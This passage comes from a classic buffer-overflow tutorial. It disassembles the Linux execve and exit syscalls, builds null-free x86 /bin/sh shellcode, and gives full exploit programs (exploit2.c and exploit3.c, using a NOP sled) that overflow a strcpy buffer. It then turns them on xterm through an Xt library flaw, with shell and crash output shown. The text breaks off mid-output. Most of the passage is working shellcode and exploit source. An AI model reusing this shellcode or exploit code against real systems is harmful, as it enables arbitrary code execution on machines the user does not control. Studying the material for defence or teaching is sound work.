pushl %edx 0x80002d9 <__execve+29>: call 0x8001a34 <__normal_errno_location> 0x80002de <__execve+34>: popl %edx 0x80002df <__execve+35>: movl %edx,(%eax) 0x80002e1 <__execve+37>: movl $0xffffffff,%eax 0x80002e6 <__execve+42>: popl %ebx 0x80002e7 <__execve+43>: movl %ebp,%esp 0x80002e9 <__execve+45>: popl %ebp 0x80002ea <__execve+46>: ret 0x80002eb <__execve+47>: nop End of assembler dump. ------------------------------------------------------------------------------ Lets try to understand what is going on here. We'll start by studying main: ------------------------------------------------------------------------------ 0x8000130 <main>: pushl %ebp 0x8000131 <main+1>: movl %esp,%ebp 0x8000133 <main+3>: subl $0x8,%esp This is the procedure prelude. It first saves the old frame pointer, makes the current stack pointer the new frame pointer, and leaves space for the local variables. In this case its: char *name[2]; or 2 pointers to a char. Pointers are a word long, so it leaves space for two words (8 bytes). 0x8000136 <main+6>: movl $0x80027b8,0xfffffff8(%ebp) We copy the value 0x80027b8 (the address of the string \"/bin/sh\") into the first pointer of name[]. This is equivalent to: name[0] = \"/bin/sh\"; 0x800013d <main+13>: movl $0x0,0xfffffffc(%ebp) We copy the value 0x0 (NULL) into the seconds pointer of name[]. This is equivalent to: name[1] = NULL; The actual call to execve() starts here. 0x8000144 <main+20>: pushl $0x0 We push the arguments to execve() in reverse order onto the stack. We start with NULL. 0x8000146 <main+22>: leal 0xfffffff8(%ebp),%eax We load the address of name[] into the EAX register. 0x8000149 <main+25>: pushl %eax We push the address of name[] onto the stack. 0x800014a <main+26>: movl 0xfffffff8(%ebp),%eax We load the address of the string \"/bin/sh\" into the EAX register. 0x800014d <main+29>: pushl %eax We push the address of the string \"/bin/sh\" onto the stack. 0x800014e <main+30>: call 0x80002bc <__execve> Call the library procedure execve(). The call instruction pushes the IP onto the stack. ------------------------------------------------------------------------------ Now execve(). Keep in mind we are using a Intel based Linux system. The syscall details will change from OS to OS, and from CPU to CPU. Some will pass the arguments on the stack, others on the registers. Some use a software interrupt to jump to kernel mode, others use a far call. Linux passes its arguments to the system call on the registers, and uses a software interrupt to jump into kernel mode. ------------------------------------------------------------------------------ 0x80002bc <__execve>: pushl %ebp 0x80002bd <__execve+1>: movl %esp,%ebp 0x80002bf <__execve+3>: pushl %ebx The procedure prelude. 0x80002c0 <__execve+4>: movl $0xb,%eax Copy 0xb (11 decimal) onto the stack. This is the index into the syscall table. 11 is execve. 0x80002c5 <__execve+9>: movl 0x8(%ebp),%ebx Copy the address of \"/bin/sh\" into EBX. 0x80002c8 <__execve+12>: movl 0xc(%ebp),%ecx Copy the address of name[] into ECX. 0x80002cb <__execve+15>: movl 0x10(%ebp),%edx Copy the address of the null pointer into %edx. 0x80002ce <__execve+18>: int $0x80 Change into kernel mode. ------------------------------------------------------------------------------ So as we can see there is not much to the execve() system call. All we need to do is: a) Have the null terminated string \"/bin/sh\" somewhere in memory. b) Have the address of the string \"/bin/sh\" somewhere in memory followed by a null long word. c) Copy 0xb into the EAX register. d) Copy the address of the address of the string \"/bin/sh\" into the EBX register. e) Copy the address of the string \"/bin/sh\" into the ECX register. f) Copy the address of the null long word into the EDX register. g) Execute the int $0x80 instruction. But what if the execve() call fails for some reason? The program will continue fetching instructions from the stack, which may contain random data! The program will most likely core dump. We want the program to exit cleanly if the execve syscall fails. To accomplish this we must then add a exit syscall after the execve syscall. What does the exit syscall looks like? exit.c ------------------------------------------------------------------------------ #include <stdlib.h> void main() { exit(0); } ------------------------------------------------------------------------------ ------------------------------------------------------------------------------ [aleph1]$ gcc -o exit -static exit.c [aleph1]$ gdb exit GDB is free software and you are welcome to distribute copies of it under certain conditions; type \"show copying\" to see the conditions. There is absolutely no warranty for GDB; type \"show warranty\" for details. GDB 4.15 (i586-unknown-linux), Copyright 1995 Free Software Foundation, Inc... (no debugging symbols found)... (gdb) disassemble _exit Dump of assembler code for function _exit: 0x800034c <_exit>: pushl %ebp 0x800034d <_exit+1>: movl %esp,%ebp 0x800034f <_exit+3>: pushl %ebx 0x8000350 <_exit+4>: movl $0x1,%eax 0x8000355 <_exit+9>: movl 0x8(%ebp),%ebx 0x8000358 <_exit+12>: int $0x80 0x800035a <_exit+14>: movl 0xfffffffc(%ebp),%ebx 0x800035d <_exit+17>: movl %ebp,%esp 0x800035f <_exit+19>: popl %ebp 0x8000360 <_exit+20>: ret 0x8000361 <_exit+21>: nop 0x8000362 <_exit+22>: nop 0x8000363 <_exit+23>: nop End of assembler dump. ------------------------------------------------------------------------------ The exit syscall will place 0x1 in EAX, place the exit code in EBX, and execute \"int 0x80\". That's it. Most applications return 0 on exit to indicate no errors. We will place 0 in EBX. Our list of steps is now: a) Have the null terminated string \"/bin/sh\" somewhere in memory. b) Have the address of the string \"/bin/sh\" somewhere in memory followed by a null long word. c) Copy 0xb into the EAX register. d) Copy the address of the address of the string \"/bin/sh\" into the EBX register. e) Copy the address of the string \"/bin/sh\" into the ECX register. f) Copy the address of the null long word into the EDX register. g) Execute the int $0x80 instruction. h) Copy 0x1 into the EAX register. i) Copy 0x0 into the EBX register. j) Execute the int $0x80 instruction. Trying to put this together in assembly language, placing the string after the code, and remembering we will place the address of the string, and null word after the array, we have: ------------------------------------------------------------------------------ movl string_addr,string_addr_addr movb $0x0,null_byte_addr movl $0x0,null_addr movl $0xb,%eax movl string_addr,%ebx leal string_addr,%ecx leal null_string,%edx int $0x80 movl $0x1, %eax movl $0x0, %ebx int $0x80 /bin/sh string goes here. ------------------------------------------------------------------------------ The problem is that we don't know where in the memory space of the program we are trying to exploit the code (and the string that follows it) will be placed. One way around it is to use a JMP, and a CALL instruction. The JMP and CALL instructions can use IP relative addressing, which means we can jump to an offset from the current IP without needing to know the exact address of where in memory we want to jump to. If we place a CALL instruction right before the \"/bin/sh\" string, and a JMP instruction to it, the strings address will be pushed onto the stack as the return address when CALL is executed. All we need then is to copy the return address into a register. The CALL instruction can simply call the start of our code above. Assuming now that J stands for the JMP instruction, C for the CALL instruction, and s for the string, the execution flow would now be: bottom of DDDDDDDDEEEEEEEEEEEE EEEE FFFF FFFF FFFF FFFF top of memory 89ABCDEF0123456789AB CDEF 0123 4567 89AB CDEF memory buffer sfp ret a b c <------ [JJSSSSSSSSSSSSSSCCss][ssss][0xD8][0x01][0x02][0x03] ^|^ ^| | |||_____________||____________| (1) (2) ||_____________|| |______________| (3) top of bottom of stack stack With this modifications, using indexed addressing, and writing down how many bytes each instruction takes our code looks like: ------------------------------------------------------------------------------ jmp offset-to-call # 2 bytes popl %esi # 1 byte movl %esi,array-offset(%esi) # 3 bytes movb $0x0,nullbyteoffset(%esi)# 4 bytes movl $0x0,null-offset(%esi) # 7 bytes movl $0xb,%eax # 5 bytes movl %esi,%ebx # 2 bytes leal array-offset,(%esi),%ecx # 3 bytes leal null-offset(%esi),%edx # 3 bytes int $0x80 # 2 bytes movl $0x1, %eax # 5 bytes movl $0x0, %ebx # 5 bytes int $0x80 # 2 bytes call offset-to-popl # 5 bytes /bin/sh string goes here. ------------------------------------------------------------------------------ Calculating the offsets from jmp to call, from call to popl, from the string address to the array, and from the string address to the null long word, we now have: ------------------------------------------------------------------------------ jmp 0x26 # 2 bytes popl %esi # 1 byte movl %esi,0x8(%esi) # 3 bytes movb $0x0,0x7(%esi) # 4 bytes movl $0x0,0xc(%esi) # 7 bytes movl $0xb,%eax # 5 bytes movl %esi,%ebx # 2 bytes leal 0x8(%esi),%ecx # 3 bytes leal 0xc(%esi),%edx # 3 bytes int $0x80 # 2 bytes movl $0x1, %eax # 5 bytes movl $0x0, %ebx # 5 bytes int $0x80 # 2 bytes call -0x2b # 5 bytes .string \\\"/bin/sh\\\" # 8 bytes ------------------------------------------------------------------------------ Looks good. To make sure it works correctly we must compile it and run it. But there is a problem. Our code modifies itself, but most operating system mark code pages read-only. To get around this restriction we must place the code we wish to execute in the stack or data segment, and transfer control to it. To do so we will place our code in a global array in the data segment. We need first a hex representation of the binary code. Lets compile it first, and then use gdb to obtain it. shellcodeasm.c ------------------------------------------------------------------------------ void main() { __asm__(\" jmp 0x2a # 3 bytes popl %esi # 1 byte movl %esi,0x8(%esi) # 3 bytes movb $0x0,0x7(%esi) # 4 bytes movl $0x0,0xc(%esi) # 7 bytes movl $0xb,%eax # 5 bytes movl %esi,%ebx # 2 bytes leal 0x8(%esi),%ecx # 3 bytes leal 0xc(%esi),%edx # 3 bytes int $0x80 # 2 bytes movl $0x1, %eax # 5 bytes movl $0x0, %ebx # 5 bytes int $0x80 # 2 bytes call -0x2f # 5 bytes .string \\\"/bin/sh\\\" # 8 bytes \"); } ------------------------------------------------------------------------------ ------------------------------------------------------------------------------ [aleph1]$ gcc -o shellcodeasm -g -ggdb shellcodeasm.c [aleph1]$ gdb shellcodeasm GDB is free software and you are welcome to distribute copies of it under certain conditions; type \"show copying\" to see the conditions. There is absolutely no warranty for GDB; type \"show warranty\" for details. GDB 4.15 (i586-unknown-linux), Copyright 1995 Free Software Foundation, Inc... (gdb) disassemble main Dump of assembler code for function main: 0x8000130 <main>: pushl %ebp 0x8000131 <main+1>: movl %esp,%ebp 0x8000133 <main+3>: jmp 0x800015f <main+47> 0x8000135 <main+5>: popl %esi 0x8000136 <main+6>: movl %esi,0x8(%esi) 0x8000139 <main+9>: movb $0x0,0x7(%esi) 0x800013d <main+13>: movl $0x0,0xc(%esi) 0x8000144 <main+20>: movl $0xb,%eax 0x8000149 <main+25>: movl %esi,%ebx 0x800014b <main+27>: leal 0x8(%esi),%ecx 0x800014e <main+30>: leal 0xc(%esi),%edx 0x8000151 <main+33>: int $0x80 0x8000153 <main+35>: movl $0x1,%eax 0x8000158 <main+40>: movl $0x0,%ebx 0x800015d <main+45>: int $0x80 0x800015f <main+47>: call 0x8000135 <main+5> 0x8000164 <main+52>: das 0x8000165 <main+53>: boundl 0x6e(%ecx),%ebp 0x8000168 <main+56>: das 0x8000169 <main+57>: jae 0x80001d3 <__new_exitfn+55> 0x800016b <main+59>: addb %cl,0x55c35dec(%ecx) End of assembler dump. (gdb) x/bx main+3 0x8000133 <main+3>: 0xeb (gdb) 0x8000134 <main+4>: 0x2a (gdb) . . . ------------------------------------------------------------------------------ testsc.c ------------------------------------------------------------------------------ char shellcode[] = \"\\xeb\\x2a\\x5e\\x89\\x76\\x08\\xc6\\x46\\x07\\x00\\xc7\\x46\\x0c\\x00\\x00\\x00\" \"\\x00\\xb8\\x0b\\x00\\x00\\x00\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\" \"\\xb8\\x01\\x00\\x00\\x00\\xbb\\x00\\x00\\x00\\x00\\xcd\\x80\\xe8\\xd1\\xff\\xff\" \"\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x00\\x89\\xec\\x5d\\xc3\"; void main() { int *ret; ret = (int *)&ret + 2; (*ret) = (int)shellcode; } ------------------------------------------------------------------------------ ------------------------------------------------------------------------------ [aleph1]$ gcc -o testsc testsc.c [aleph1]$ ./testsc $ exit [aleph1]$ ------------------------------------------------------------------------------ It works! But there is an obstacle. In most cases we'll be trying to overflow a character buffer. As such any null bytes in our shellcode will be considered the end of the string, and the copy will be terminated. There must be no null bytes in the shellcode for the exploit to work. Let's try to eliminate the bytes (and at the same time make it smaller). Problem instruction: Substitute with: -------------------------------------------------------- movb $0x0,0x7(%esi) xorl %eax,%eax molv $0x0,0xc(%esi) movb %eax,0x7(%esi) movl %eax,0xc(%esi) -------------------------------------------------------- movl $0xb,%eax movb $0xb,%al -------------------------------------------------------- movl $0x1, %eax xorl %ebx,%ebx movl $0x0, %ebx movl %ebx,%eax inc %eax -------------------------------------------------------- Our improved code: shellcodeasm2.c ------------------------------------------------------------------------------ void main() { __asm__(\" jmp 0x1f # 2 bytes popl %esi # 1 byte movl %esi,0x8(%esi) # 3 bytes xorl %eax,%eax # 2 bytes movb %eax,0x7(%esi) # 3 bytes movl %eax,0xc(%esi) # 3 bytes movb $0xb,%al # 2 bytes movl %esi,%ebx # 2 bytes leal 0x8(%esi),%ecx # 3 bytes leal 0xc(%esi),%edx # 3 bytes int $0x80 # 2 bytes xorl %ebx,%ebx # 2 bytes movl %ebx,%eax # 2 bytes inc %eax # 1 bytes int $0x80 # 2 bytes call -0x24 # 5 bytes .string \\\"/bin/sh\\\" # 8 bytes # 46 bytes total \"); } ------------------------------------------------------------------------------ And our new test program: testsc2.c ------------------------------------------------------------------------------ char shellcode[] = \"\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b\" \"\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd\" \"\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh\"; void main() { int *ret; ret = (int *)&ret + 2; (*ret) = (int)shellcode; } ------------------------------------------------------------------------------ ------------------------------------------------------------------------------ [aleph1]$ gcc -o testsc2 testsc2.c [aleph1]$ ./testsc2 $ exit [aleph1]$ ------------------------------------------------------------------------------ Writing an Exploit ~~~~~~~~~~~~~~~~~~ (or how to mung the stack) ~~~~~~~~~~~~~~~~~~~~~~~~~~ Lets try to pull all our pieces together. We have the shellcode. We know it must be part of the string which we'll use to overflow the buffer. We know we must point the return address back into the buffer. This example will demonstrate these points: overflow1.c ------------------------------------------------------------------------------ char shellcode[] = \"\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b\" \"\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd\" \"\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh\"; char large_string[128]; void main() { char buffer[96]; int i; long *long_ptr = (long *) large_string; for (i = 0; i < 32; i++) *(long_ptr + i) = (int) buffer; for (i = 0; i < strlen(shellcode); i++) large_string[i] = shellcode[i]; strcpy(buffer,large_string); } ------------------------------------------------------------------------------ ------------------------------------------------------------------------------ [aleph1]$ gcc -o exploit1 exploit1.c [aleph1]$ ./exploit1 $ exit exit [aleph1]$ ------------------------------------------------------------------------------ What we have done above is filled the array large_string[] with the address of buffer[], which is where our code will be. Then we copy our shellcode into the beginning of the large_string string. strcpy() will then copy large_string onto buffer without doing any bounds checking, and will overflow the return address, overwriting it with the address where our code is now located. Once we reach the end of main and it tried to return it jumps to our code, and execs a shell. The problem we are faced when trying to overflow the buffer of another program is trying to figure out at what address the buffer (and thus our code) will be. The answer is that for every program the stack will start at the same address. Most programs do not push more than a few hundred or a few thousand bytes into the stack at any one time. Therefore by knowing where the stack starts we can try to guess where the buffer we are trying to overflow will be. Here is a little program that will print its stack pointer: sp.c ------------------------------------------------------------------------------ unsigned long get_sp(void) { __asm__(\"movl %esp,%eax\"); } void main() { printf(\"0x%x\\n\", get_sp()); } ------------------------------------------------------------------------------ ------------------------------------------------------------------------------ [aleph1]$ ./sp 0x8000470 [aleph1]$ ------------------------------------------------------------------------------ Lets assume this is the program we are trying to overflow is: vulnerable.c ------------------------------------------------------------------------------ void main(int argc, char *argv[]) { char buffer[512]; if (argc > 1) strcpy(buffer,argv[1]); } ------------------------------------------------------------------------------ We can create a program that takes as a parameter a buffer size, and an offset from its own stack pointer (where we believe the buffer we want to overflow may live). We'll put the overflow string in an environment variable so it is easy to manipulate: exploit2.c ------------------------------------------------------------------------------ #include <stdlib.h> #define DEFAULT_OFFSET 0 #define DEFAULT_BUFFER_SIZE 512 char shellcode[] = \"\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b\" \"\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd\" \"\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh\"; unsigned long get_sp(void) { __asm__(\"movl %esp,%eax\"); } void main(int argc, char *argv[]) { char *buff, *ptr; long *addr_ptr, addr; int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE; int i; if (argc > 1) bsize = atoi(argv[1]); if (argc > 2) offset = atoi(argv[2]); if (!(buff = malloc(bsize))) { printf(\"Can't allocate memory.\\n\"); exit(0); } addr = get_sp() - offset; printf(\"Using address: 0x%x\\n\", addr); ptr = buff; addr_ptr = (long *) ptr; for (i = 0; i < bsize; i+=4) *(addr_ptr++) = addr; ptr += 4; for (i = 0; i < strlen(shellcode); i++) *(ptr++) = shellcode[i]; buff[bsize - 1] = '\\0'; memcpy(buff,\"EGG=\",4); putenv(buff); system(\"/bin/bash\"); } ------------------------------------------------------------------------------ Now we can try to guess what the buffer and offset should be: ------------------------------------------------------------------------------ [aleph1]$ ./exploit2 500 Using address: 0xbffffdb4 [aleph1]$ ./vulnerable $EGG [aleph1]$ exit [aleph1]$ ./exploit2 600 Using address: 0xbffffdb4 [aleph1]$ ./vulnerable $EGG Illegal instruction [aleph1]$ exit [aleph1]$ ./exploit2 600 100 Using address: 0xbffffd4c [aleph1]$ ./vulnerable $EGG Segmentation fault [aleph1]$ exit [aleph1]$ ./exploit2 600 200 Using address: 0xbffffce8 [aleph1]$ ./vulnerable $EGG Segmentation fault [aleph1]$ exit . . . [aleph1]$ ./exploit2 600 1564 Using address: 0xbffff794 [aleph1]$ ./vulnerable $EGG $ ------------------------------------------------------------------------------ As we can see this is not an efficient process. Trying to guess the offset even while knowing where the beginning of the stack lives is nearly impossible. We would need at best a hundred tries, and at worst a couple of thousand. The problem is we need to guess *exactly* where the address of our code will start. If we are off by one byte more or less we will just get a segmentation violation or a invalid instruction. One way to increase our chances is to pad the front of our overflow buffer with NOP instructions. Almost all processors have a NOP instruction that performs a null operation. It is usually used to delay execution for purposes of timing. We will take advantage of it and fill half of our overflow buffer with them. We will place our shellcode at the center, and then follow it with the return addresses. If we are lucky and the return address points anywhere in the string of NOPs, they will just get executed until they reach our code. In the Intel architecture the NOP instruction is one byte long and it translates to 0x90 in machine code. Assuming the stack starts at address 0xFF, that S stands for shell code, and that N stands for a NOP instruction the new stack would look like this: bottom of DDDDDDDDEEEEEEEEEEEE EEEE FFFF FFFF FFFF FFFF top of memory 89ABCDEF0123456789AB CDEF 0123 4567 89AB CDEF memory buffer sfp ret a b c <------ [NNNNNNNNNNNSSSSSSSSS][0xDE][0xDE][0xDE][0xDE][0xDE] ^ | |_____________________| top of bottom of stack stack The new exploits is then: exploit3.c ------------------------------------------------------------------------------ #include <stdlib.h> #define DEFAULT_OFFSET 0 #define DEFAULT_BUFFER_SIZE 512 #define NOP 0x90 char shellcode[] = \"\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b\" \"\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd\" \"\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh\"; unsigned long get_sp(void) { __asm__(\"movl %esp,%eax\"); } void main(int argc, char *argv[]) { char *buff, *ptr; long *addr_ptr, addr; int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE; int i; if (argc > 1) bsize = atoi(argv[1]); if (argc > 2) offset = atoi(argv[2]); if (!(buff = malloc(bsize))) { printf(\"Can't allocate memory.\\n\"); exit(0); } addr = get_sp() - offset; printf(\"Using address: 0x%x\\n\", addr); ptr = buff; addr_ptr = (long *) ptr; for (i = 0; i < bsize; i+=4) *(addr_ptr++) = addr; for (i = 0; i < bsize/2; i++) buff[i] = NOP; ptr = buff + ((bsize/2) - (strlen(shellcode)/2)); for (i = 0; i < strlen(shellcode); i++) *(ptr++) = shellcode[i]; buff[bsize - 1] = '\\0'; memcpy(buff,\"EGG=\",4); putenv(buff); system(\"/bin/bash\"); } ------------------------------------------------------------------------------ A good selection for our buffer size is about 100 bytes more than the size of the buffer we are trying to overflow. This will place our code at the end of the buffer we are trying to overflow, giving a lot of space for the NOPs, but still overwriting the return address with the address we guessed. The buffer we are trying to overflow is 512 bytes long, so we'll use 612. Let's try to overflow our test program with our new exploit: ------------------------------------------------------------------------------ [aleph1]$ ./exploit3 612 Using address: 0xbffffdb4 [aleph1]$ ./vulnerable $EGG $ ------------------------------------------------------------------------------ Whoa! First try! This change has improved our chances a hundredfold. Let's try it now on a real case of a buffer overflow. We'll use for our demonstration the buffer overflow on the Xt library. For our example, we'll use xterm (all programs linked with the Xt library are vulnerable). You must be running an X server and allow connections to it from the localhost. Set your DISPLAY variable accordingly. ------------------------------------------------------------------------------ [aleph1]$ export DISPLAY=:0.0 [aleph1]$ ./exploit3 1124 Using address: 0xbffffdb4 [aleph1]$ /usr/X11R6/bin/xterm -fg $EGG Warning: Color name \"\u00eb^1\u00a4FF \u00b0 \u00f3V \u00a41\u00a4\u00d8@\u00a4\u00e8\u00dc\u00ff\u00ff\u00ff/bin/sh\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4 \u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4 \u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4 ^C [aleph1]$ exit [aleph1]$ ./exploit3 2148 100 Using address: 0xbffffd48 [aleph1]$ /usr/X11R6/bin/xterm -fg $EGG Warning: Color name \"\u00eb^1\u00a4FF \u00b0 \u00f3V \u00a41\u00a4\u00d8@\u00a4\u00e8\u00dc\u00ff\u00ff\u00ff/bin/sh\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4 